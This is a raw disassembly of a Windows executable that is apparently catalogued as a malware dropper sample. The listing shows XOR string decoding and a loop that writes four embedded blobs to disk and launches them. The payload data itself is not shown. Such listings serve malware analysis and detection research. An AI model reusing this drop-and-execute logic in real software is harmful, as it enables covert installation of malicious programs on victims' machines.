
malware_samples/dropper/4c4fe95cf6d9ac5ac79ec4daa54e4188fe33460b58906ae9bfa06f7188e2ba89.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401009:	90                   	nop
  40100a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40100d:	40                   	inc    %eax
  40100e:	50                   	push   %eax
  40100f:	e8 e4 05 00 00       	call   0x4015f8
  401014:	83 c4 04             	add    $0x4,%esp
  401017:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40101a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40101d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401020:	01 c1                	add    %eax,%ecx
  401022:	b8 00 00 00 00       	mov    $0x0,%eax
  401027:	88 01                	mov    %al,(%ecx)
  401029:	b8 00 00 00 00       	mov    $0x0,%eax
  40102e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401031:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401034:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401037:	39 c8                	cmp    %ecx,%eax
  401039:	0f 8d 48 00 00 00    	jge    0x401087
  40103f:	e9 09 00 00 00       	jmp    0x40104d
  401044:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401047:	40                   	inc    %eax
  401048:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40104b:	eb e4                	jmp    0x401031
  40104d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401050:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401053:	01 c1                	add    %eax,%ecx
  401055:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401058:	8b 55 08             	mov    0x8(%ebp),%edx
  40105b:	01 c2                	add    %eax,%edx
  40105d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401060:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401063:	b9 20 00 00 00       	mov    $0x20,%ecx
  401068:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40106b:	99                   	cltd
  40106c:	f7 f9                	idiv   %ecx
  40106e:	b8 00 20 40 00       	mov    $0x402000,%eax
  401073:	01 d0                	add    %edx,%eax
  401075:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401078:	0f be 09             	movsbl (%ecx),%ecx
  40107b:	0f be 10             	movsbl (%eax),%edx
  40107e:	31 d1                	xor    %edx,%ecx
  401080:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401083:	88 08                	mov    %cl,(%eax)
  401085:	eb bd                	jmp    0x401044
  401087:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40108a:	c9                   	leave
  40108b:	c3                   	ret
  40108c:	55                   	push   %ebp
  40108d:	89 e5                	mov    %esp,%ebp
  40108f:	81 ec 8c 04 00 00    	sub    $0x48c,%esp
  401095:	90                   	nop
  401096:	b8 30 00 00 00       	mov    $0x30,%eax
  40109b:	50                   	push   %eax
  40109c:	b8 00 00 00 00       	mov    $0x0,%eax
  4010a1:	50                   	push   %eax
  4010a2:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4010a5:	50                   	push   %eax
  4010a6:	e8 55 05 00 00       	call   0x401600
  4010ab:	83 c4 0c             	add    $0xc,%esp
  4010ae:	b8 21 20 40 00       	mov    $0x402021,%eax
  4010b3:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4010b6:	b8 26 20 40 00       	mov    $0x402026,%eax
  4010bb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4010be:	b8 35 20 40 00       	mov    $0x402035,%eax
  4010c3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4010c6:	b8 36 84 45 00       	mov    $0x458436,%eax
  4010cb:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4010ce:	b8 3b 84 45 00       	mov    $0x45843b,%eax
  4010d3:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4010d6:	b8 4a 84 45 00       	mov    $0x45844a,%eax
  4010db:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4010de:	b8 4b a0 4a 00       	mov    $0x4aa04b,%eax
  4010e3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4010e6:	b8 50 a0 4a 00       	mov    $0x4aa050,%eax
  4010eb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4010ee:	b8 5c a0 4a 00       	mov    $0x4aa05c,%eax
  4010f3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010f6:	b8 5d 44 74 00       	mov    $0x74445d,%eax
  4010fb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010fe:	b8 62 44 74 00       	mov    $0x744462,%eax
  401103:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401106:	b8 6c 44 74 00       	mov    $0x74446c,%eax
  40110b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40110e:	b8 40 00 00 00       	mov    $0x40,%eax
  401113:	50                   	push   %eax
  401114:	b8 00 00 00 00       	mov    $0x0,%eax
  401119:	50                   	push   %eax
  40111a:	8d 45 90             	lea    -0x70(%ebp),%eax
  40111d:	50                   	push   %eax
  40111e:	e8 dd 04 00 00       	call   0x401600
  401123:	83 c4 0c             	add    $0xc,%esp
  401126:	b8 04 00 00 00       	mov    $0x4,%eax
  40112b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40112e:	b8 0e 00 00 00       	mov    $0xe,%eax
  401133:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401136:	b8 00 64 05 00       	mov    $0x56400,%eax
  40113b:	89 45 98             	mov    %eax,-0x68(%ebp)
  40113e:	b8 01 00 00 00       	mov    $0x1,%eax
  401143:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401146:	b8 04 00 00 00       	mov    $0x4,%eax
  40114b:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40114e:	b8 0e 00 00 00       	mov    $0xe,%eax
  401153:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401156:	b8 00 1c 05 00       	mov    $0x51c00,%eax
  40115b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40115e:	b8 01 00 00 00       	mov    $0x1,%eax
  401163:	89 45 ac             	mov    %eax,-0x54(%ebp)
  401166:	b8 04 00 00 00       	mov    $0x4,%eax
  40116b:	89 45 b0             	mov    %eax,-0x50(%ebp)
  40116e:	b8 0b 00 00 00       	mov    $0xb,%eax
  401173:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401176:	b8 00 a4 29 00       	mov    $0x29a400,%eax
  40117b:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40117e:	b8 01 00 00 00       	mov    $0x1,%eax
  401183:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401186:	b8 04 00 00 00       	mov    $0x4,%eax
  40118b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40118e:	b8 09 00 00 00       	mov    $0x9,%eax
  401193:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401196:	b8 00 2a 04 00       	mov    $0x42a00,%eax
  40119b:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40119e:	b8 01 00 00 00       	mov    $0x1,%eax
  4011a3:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4011a6:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ab:	89 85 7c fb ff ff    	mov    %eax,-0x484(%ebp)
  4011b1:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  4011b7:	83 f8 04             	cmp    $0x4,%eax
  4011ba:	0f 8d fe 01 00 00    	jge    0x4013be
  4011c0:	e9 0f 00 00 00       	jmp    0x4011d4
  4011c5:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  4011cb:	40                   	inc    %eax
  4011cc:	89 85 7c fb ff ff    	mov    %eax,-0x484(%ebp)
  4011d2:	eb dd                	jmp    0x4011b1
  4011d4:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  4011da:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4011df:	0f af c1             	imul   %ecx,%eax
  4011e2:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4011e5:	01 c1                	add    %eax,%ecx
  4011e7:	b8 6d 6e 78 00       	mov    $0x786e6d,%eax
  4011ec:	50                   	push   %eax
  4011ed:	8b 01                	mov    (%ecx),%eax
  4011ef:	50                   	push   %eax
  4011f0:	e8 13 04 00 00       	call   0x401608
  4011f5:	83 c4 08             	add    $0x8,%esp
  4011f8:	83 f8 00             	cmp    $0x0,%eax
  4011fb:	0f 85 4a 00 00 00    	jne    0x40124b
  401201:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  401207:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40120c:	0f af c1             	imul   %ecx,%eax
  40120f:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401212:	01 c1                	add    %eax,%ecx
  401214:	83 c1 04             	add    $0x4,%ecx
  401217:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  40121d:	c1 e0 04             	shl    $0x4,%eax
  401220:	8d 55 90             	lea    -0x70(%ebp),%edx
  401223:	01 c2                	add    %eax,%edx
  401225:	83 c2 04             	add    $0x4,%edx
  401228:	8b 02                	mov    (%edx),%eax
  40122a:	50                   	push   %eax
  40122b:	8b 01                	mov    (%ecx),%eax
  40122d:	50                   	push   %eax
  40122e:	e8 cd fd ff ff       	call   0x401000
  401233:	83 c4 08             	add    $0x8,%esp
  401236:	50                   	push   %eax
  401237:	8d 85 80 fb ff ff    	lea    -0x480(%ebp),%eax
  40123d:	50                   	push   %eax
  40123e:	e8 cd 03 00 00       	call   0x401610
  401243:	83 c4 08             	add    $0x8,%esp
  401246:	e9 90 00 00 00       	jmp    0x4012db
  40124b:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  401251:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401256:	0f af c1             	imul   %ecx,%eax
  401259:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40125c:	01 c1                	add    %eax,%ecx
  40125e:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  401264:	c1 e0 04             	shl    $0x4,%eax
  401267:	8d 55 90             	lea    -0x70(%ebp),%edx
  40126a:	01 c2                	add    %eax,%edx
  40126c:	8b 02                	mov    (%edx),%eax
  40126e:	50                   	push   %eax
  40126f:	8b 01                	mov    (%ecx),%eax
  401271:	50                   	push   %eax
  401272:	e8 89 fd ff ff       	call   0x401000
  401277:	83 c4 08             	add    $0x8,%esp
  40127a:	50                   	push   %eax
  40127b:	e8 98 03 00 00       	call   0x401618
  401280:	83 c4 04             	add    $0x4,%esp
  401283:	8b 8d 7c fb ff ff    	mov    -0x484(%ebp),%ecx
  401289:	ba 0c 00 00 00       	mov    $0xc,%edx
  40128e:	0f af ca             	imul   %edx,%ecx
  401291:	8d 55 d0             	lea    -0x30(%ebp),%edx
  401294:	01 ca                	add    %ecx,%edx
  401296:	83 c2 04             	add    $0x4,%edx
  401299:	8b 8d 7c fb ff ff    	mov    -0x484(%ebp),%ecx
  40129f:	c1 e1 04             	shl    $0x4,%ecx
  4012a2:	89 85 78 fb ff ff    	mov    %eax,-0x488(%ebp)
  4012a8:	8d 45 90             	lea    -0x70(%ebp),%eax
  4012ab:	01 c8                	add    %ecx,%eax
  4012ad:	83 c0 04             	add    $0x4,%eax
  4012b0:	8b 08                	mov    (%eax),%ecx
  4012b2:	51                   	push   %ecx
  4012b3:	8b 02                	mov    (%edx),%eax
  4012b5:	50                   	push   %eax
  4012b6:	e8 45 fd ff ff       	call   0x401000
  4012bb:	83 c4 08             	add    $0x8,%esp
  4012be:	50                   	push   %eax
  4012bf:	8b 85 78 fb ff ff    	mov    -0x488(%ebp),%eax
  4012c5:	50                   	push   %eax
  4012c6:	b8 7f 6e 78 00       	mov    $0x786e7f,%eax
  4012cb:	50                   	push   %eax
  4012cc:	8d 85 80 fb ff ff    	lea    -0x480(%ebp),%eax
  4012d2:	50                   	push   %eax
  4012d3:	e8 48 03 00 00       	call   0x401620
  4012d8:	83 c4 10             	add    $0x10,%esp
  4012db:	b8 85 6e 78 00       	mov    $0x786e85,%eax
  4012e0:	50                   	push   %eax
  4012e1:	8d 85 80 fb ff ff    	lea    -0x480(%ebp),%eax
  4012e7:	50                   	push   %eax
  4012e8:	e8 3b 03 00 00       	call   0x401628
  4012ed:	83 c4 08             	add    $0x8,%esp
  4012f0:	89 85 74 fb ff ff    	mov    %eax,-0x48c(%ebp)
  4012f6:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  4012fc:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401301:	0f af c1             	imul   %ecx,%eax
  401304:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401307:	01 c1                	add    %eax,%ecx
  401309:	83 c1 08             	add    $0x8,%ecx
  40130c:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  401312:	c1 e0 04             	shl    $0x4,%eax
  401315:	8d 55 90             	lea    -0x70(%ebp),%edx
  401318:	01 c2                	add    %eax,%edx
  40131a:	83 c2 08             	add    $0x8,%edx
  40131d:	8b 02                	mov    (%edx),%eax
  40131f:	50                   	push   %eax
  401320:	8b 01                	mov    (%ecx),%eax
  401322:	50                   	push   %eax
  401323:	e8 d8 fc ff ff       	call   0x401000
  401328:	83 c4 08             	add    $0x8,%esp
  40132b:	8b 8d 7c fb ff ff    	mov    -0x484(%ebp),%ecx
  401331:	c1 e1 04             	shl    $0x4,%ecx
  401334:	8d 55 90             	lea    -0x70(%ebp),%edx
  401337:	01 ca                	add    %ecx,%edx
  401339:	83 c2 08             	add    $0x8,%edx
  40133c:	8b 8d 74 fb ff ff    	mov    -0x48c(%ebp),%ecx
  401342:	51                   	push   %ecx
  401343:	b9 01 00 00 00       	mov    $0x1,%ecx
  401348:	51                   	push   %ecx
  401349:	8b 0a                	mov    (%edx),%ecx
  40134b:	51                   	push   %ecx
  40134c:	50                   	push   %eax
  40134d:	e8 de 02 00 00       	call   0x401630
  401352:	83 c4 10             	add    $0x10,%esp
  401355:	8b 85 74 fb ff ff    	mov    -0x48c(%ebp),%eax
  40135b:	50                   	push   %eax
  40135c:	e8 d7 02 00 00       	call   0x401638
  401361:	83 c4 04             	add    $0x4,%esp
  401364:	8b 85 7c fb ff ff    	mov    -0x484(%ebp),%eax
  40136a:	c1 e0 04             	shl    $0x4,%eax
  40136d:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  401370:	01 c1                	add    %eax,%ecx
  401372:	83 c1 0c             	add    $0xc,%ecx
  401375:	8b 01                	mov    (%ecx),%eax
  401377:	83 f8 00             	cmp    $0x0,%eax
  40137a:	0f 84 39 00 00 00    	je     0x4013b9
  401380:	b8 04 00 00 00       	mov    $0x4,%eax
  401385:	50                   	push   %eax
  401386:	b8 88 6e 78 00       	mov    $0x786e88,%eax
  40138b:	50                   	push   %eax
  40138c:	e8 6f fc ff ff       	call   0x401000
  401391:	83 c4 08             	add    $0x8,%esp
  401394:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401399:	51                   	push   %ecx
  40139a:	b9 00 00 00 00       	mov    $0x0,%ecx
  40139f:	51                   	push   %ecx
  4013a0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4013a5:	51                   	push   %ecx
  4013a6:	8d 8d 80 fb ff ff    	lea    -0x480(%ebp),%ecx
  4013ac:	51                   	push   %ecx
  4013ad:	50                   	push   %eax
  4013ae:	b8 00 00 00 00       	mov    $0x0,%eax
  4013b3:	50                   	push   %eax
  4013b4:	e8 87 02 00 00       	call   0x401640
  4013b9:	e9 07 fe ff ff       	jmp    0x4011c5
  4013be:	b8 00 00 00 00       	mov    $0x0,%eax
  4013c3:	c9                   	leave
  4013c4:	c3                   	ret
  4013c5:	00 00                	add    %al,(%eax)
  4013c7:	00 55 89             	add    %dl,-0x77(%ebp)
  4013ca:	e5 81                	in     $0x81,%eax
  4013cc:	ec                   	in     (%dx),%al
  4013cd:	08 00                	or     %al,(%eax)
  4013cf:	00 00                	add    %al,(%eax)
  4013d1:	90                   	nop
  4013d2:	b8 00 00 00 00       	mov    $0x0,%eax
  4013d7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013da:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013dd:	c1 e0 02             	shl    $0x2,%eax
  4013e0:	b9 00 80 78 00       	mov    $0x788000,%ecx
  4013e5:	01 c1                	add    %eax,%ecx
  4013e7:	b8 00 80 78 00       	mov    $0x788000,%eax
  4013ec:	39 c1                	cmp    %eax,%ecx
  4013ee:	0f 84 2e 00 00 00    	je     0x401422
  4013f4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013f7:	89 c1                	mov    %eax,%ecx
  4013f9:	40                   	inc    %eax
  4013fa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013fd:	c1 e1 02             	shl    $0x2,%ecx
  401400:	b8 00 80 78 00       	mov    $0x788000,%eax
  401405:	01 c8                	add    %ecx,%eax
  401407:	8b 08                	mov    (%eax),%ecx
  401409:	8b 45 10             	mov    0x10(%ebp),%eax
  40140c:	50                   	push   %eax
  40140d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401410:	50                   	push   %eax
  401411:	8b 45 08             	mov    0x8(%ebp),%eax
  401414:	50                   	push   %eax
  401415:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401418:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40141b:	ff d0                	call   *%eax
  40141d:	83 c4 0c             	add    $0xc,%esp
  401420:	eb b8                	jmp    0x4013da
  401422:	c9                   	leave
  401423:	c3                   	ret
  401424:	55                   	push   %ebp
  401425:	89 e5                	mov    %esp,%ebp
  401427:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40142d:	90                   	nop
  40142e:	b8 00 00 00 00       	mov    $0x0,%eax
  401433:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401436:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401439:	c1 e0 02             	shl    $0x2,%eax
  40143c:	b9 00 80 78 00       	mov    $0x788000,%ecx
  401441:	01 c1                	add    %eax,%ecx
  401443:	b8 00 80 78 00       	mov    $0x788000,%eax
  401448:	39 c1                	cmp    %eax,%ecx
  40144a:	0f 84 1d 00 00 00    	je     0x40146d
  401450:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401453:	48                   	dec    %eax
  401454:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401457:	c1 e0 02             	shl    $0x2,%eax
  40145a:	b9 00 80 78 00       	mov    $0x788000,%ecx
  40145f:	01 c1                	add    %eax,%ecx
  401461:	8b 01                	mov    (%ecx),%eax
  401463:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401466:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401469:	ff d0                	call   *%eax
  40146b:	eb c9                	jmp    0x401436
  40146d:	c9                   	leave
  40146e:	c3                   	ret
  40146f:	55                   	push   %ebp
  401470:	89 e5                	mov    %esp,%ebp
  401472:	81 ec 08 00 00 00    	sub    $0x8,%esp
  401478:	90                   	nop
  401479:	8b 45 10             	mov    0x10(%ebp),%eax
  40147c:	50                   	push   %eax
  40147d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401480:	50                   	push   %eax
  401481:	8b 45 08             	mov    0x8(%ebp),%eax
  401484:	50                   	push   %eax
  401485:	e8 3e ff ff ff       	call   0x4013c8
  40148a:	83 c4 0c             	add    $0xc,%esp
  40148d:	8b 05 04 6f 78 00    	mov    0x786f04,%eax
  401493:	8b 0d 08 6f 78 00    	mov    0x786f08,%ecx
  401499:	8b 15 0c 6f 78 00    	mov    0x786f0c,%edx
  40149f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014a2:	8b 02                	mov    (%edx),%eax
  4014a4:	50                   	push   %eax
  4014a5:	8b 01                	mov    (%ecx),%eax
  4014a7:	50                   	push   %eax
  4014a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014ab:	8b 00                	mov    (%eax),%eax
  4014ad:	50                   	push   %eax
  4014ae:	e8 d9 fb ff ff       	call   0x40108c
  4014b3:	83 c4 0c             	add    $0xc,%esp
  4014b6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4014b9:	e8 66 ff ff ff       	call   0x401424
  4014be:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4014c1:	c9                   	leave
  4014c2:	c3                   	ret
  4014c3:	55                   	push   %ebp
  4014c4:	89 e5                	mov    %esp,%ebp
  4014c6:	81 ec 00 00 00 00    	sub    $0x0,%esp
  4014cc:	90                   	nop
  4014cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4014d0:	8b 08                	mov    (%eax),%ecx
  4014d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4014d5:	50                   	push   %eax
  4014d6:	8b 01                	mov    (%ecx),%eax
  4014d8:	50                   	push   %eax
  4014d9:	e8 6a 01 00 00       	call   0x401648
  4014de:	83 c4 08             	add    $0x8,%esp
  4014e1:	c9                   	leave
  4014e2:	c2 04 00             	ret    $0x4
  4014e5:	55                   	push   %ebp
  4014e6:	89 e5                	mov    %esp,%ebp
  4014e8:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4014ee:	90                   	nop
  4014ef:	b8 04 00 00 00       	mov    $0x4,%eax
  4014f4:	50                   	push   %eax
  4014f5:	b8 00 00 00 00       	mov    $0x0,%eax
  4014fa:	50                   	push   %eax
  4014fb:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014fe:	50                   	push   %eax
  4014ff:	e8 fc 00 00 00       	call   0x401600
  401504:	83 c4 0c             	add    $0xc,%esp
  401507:	b8 c3 14 40 00       	mov    $0x4014c3,%eax
  40150c:	50                   	push   %eax
  40150d:	e8 3e 01 00 00       	call   0x401650
  401512:	b8 01 00 00 00       	mov    $0x1,%eax
  401517:	50                   	push   %eax
  401518:	e8 3b 01 00 00       	call   0x401658
  40151d:	83 c4 04             	add    $0x4,%esp
  401520:	b8 00 00 03 00       	mov    $0x30000,%eax
  401525:	50                   	push   %eax
  401526:	b8 00 00 01 00       	mov    $0x10000,%eax
  40152b:	50                   	push   %eax
  40152c:	e8 2f 01 00 00       	call   0x401660
  401531:	83 c4 08             	add    $0x8,%esp
  401534:	8b 05 04 6f 78 00    	mov    0x786f04,%eax
  40153a:	8b 0d 08 6f 78 00    	mov    0x786f08,%ecx
  401540:	8b 15 0c 6f 78 00    	mov    0x786f0c,%edx
  401546:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401549:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40154c:	50                   	push   %eax
  40154d:	8b 05 00 80 78 00    	mov    0x788000,%eax
  401553:	50                   	push   %eax
  401554:	52                   	push   %edx
  401555:	51                   	push   %ecx
  401556:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401559:	50                   	push   %eax
  40155a:	e8 09 01 00 00       	call   0x401668
  40155f:	83 c4 14             	add    $0x14,%esp
  401562:	8b 05 04 6f 78 00    	mov    0x786f04,%eax
  401568:	8b 0d 08 6f 78 00    	mov    0x786f08,%ecx
  40156e:	8b 15 0c 6f 78 00    	mov    0x786f0c,%edx
  401574:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401577:	8b 02                	mov    (%edx),%eax
  401579:	50                   	push   %eax
  40157a:	8b 01                	mov    (%ecx),%eax
  40157c:	50                   	push   %eax
  40157d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401580:	8b 00                	mov    (%eax),%eax
  401582:	50                   	push   %eax
  401583:	e8 e7 fe ff ff       	call   0x40146f
  401588:	83 c4 0c             	add    $0xc,%esp
  40158b:	50                   	push   %eax
  40158c:	e8 df 00 00 00       	call   0x401670
  401591:	83 c4 04             	add    $0x4,%esp
  401594:	c9                   	leave
  401595:	c3                   	ret
  401596:	55                   	push   %ebp
  401597:	89 e5                	mov    %esp,%ebp
  401599:	81 ec 04 00 00 00    	sub    $0x4,%esp
  40159f:	90                   	nop
  4015a0:	8b 05 04 6f 78 00    	mov    0x786f04,%eax
  4015a6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4015a9:	89 08                	mov    %ecx,(%eax)
  4015ab:	8b 05 08 6f 78 00    	mov    0x786f08,%eax
  4015b1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4015b4:	89 08                	mov    %ecx,(%eax)
  4015b6:	b8 00 00 03 00       	mov    $0x30000,%eax
  4015bb:	50                   	push   %eax
  4015bc:	b8 00 00 01 00       	mov    $0x10000,%eax
  4015c1:	50                   	push   %eax
  4015c2:	e8 99 00 00 00       	call   0x401660
  4015c7:	83 c4 08             	add    $0x8,%esp
  4015ca:	8b 05 04 6f 78 00    	mov    0x786f04,%eax
  4015d0:	8b 0d 08 6f 78 00    	mov    0x786f08,%ecx
  4015d6:	8b 15 0c 6f 78 00    	mov    0x786f0c,%edx
  4015dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4015df:	8b 02                	mov    (%edx),%eax
  4015e1:	50                   	push   %eax
  4015e2:	8b 01                	mov    (%ecx),%eax
  4015e4:	50                   	push   %eax
  4015e5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4015e8:	8b 00                	mov    (%eax),%eax
  4015ea:	50                   	push   %eax
  4015eb:	e8 9c fa ff ff       	call   0x40108c
  4015f0:	83 c4 0c             	add    $0xc,%esp
  4015f3:	c9                   	leave
  4015f4:	c3                   	ret
  4015f5:	00 00                	add    %al,(%eax)
  4015f7:	00 ff                	add    %bh,%bh
  4015f9:	25 e0 6e 78 00       	and    $0x786ee0,%eax
  4015fe:	00 00                	add    %al,(%eax)
  401600:	ff 25 e4 6e 78 00    	jmp    *0x786ee4
  401606:	00 00                	add    %al,(%eax)
  401608:	ff 25 e8 6e 78 00    	jmp    *0x786ee8
  40160e:	00 00                	add    %al,(%eax)
  401610:	ff 25 ec 6e 78 00    	jmp    *0x786eec
  401616:	00 00                	add    %al,(%eax)
  401618:	ff 25 f0 6e 78 00    	jmp    *0x786ef0
  40161e:	00 00                	add    %al,(%eax)
  401620:	ff 25 f4 6e 78 00    	jmp    *0x786ef4
  401626:	00 00                	add    %al,(%eax)
  401628:	ff 25 f8 6e 78 00    	jmp    *0x786ef8
  40162e:	00 00                	add    %al,(%eax)
  401630:	ff 25 fc 6e 78 00    	jmp    *0x786efc
  401636:	00 00                	add    %al,(%eax)
  401638:	ff 25 00 6f 78 00    	jmp    *0x786f00
  40163e:	00 00                	add    %al,(%eax)
  401640:	ff 25 28 6f 78 00    	jmp    *0x786f28
  401646:	00 00                	add    %al,(%eax)
  401648:	ff 25 10 6f 78 00    	jmp    *0x786f10
  40164e:	00 00                	add    %al,(%eax)
  401650:	ff 25 30 6f 78 00    	jmp    *0x786f30
  401656:	00 00                	add    %al,(%eax)
  401658:	ff 25 14 6f 78 00    	jmp    *0x786f14
  40165e:	00 00                	add    %al,(%eax)
  401660:	ff 25 18 6f 78 00    	jmp    *0x786f18
  401666:	00 00                	add    %al,(%eax)
  401668:	ff 25 1c 6f 78 00    	jmp    *0x786f1c
  40166e:	00 00                	add    %al,(%eax)
  401670:	ff 25 20 6f 78 00    	jmp    *0x786f20
	...
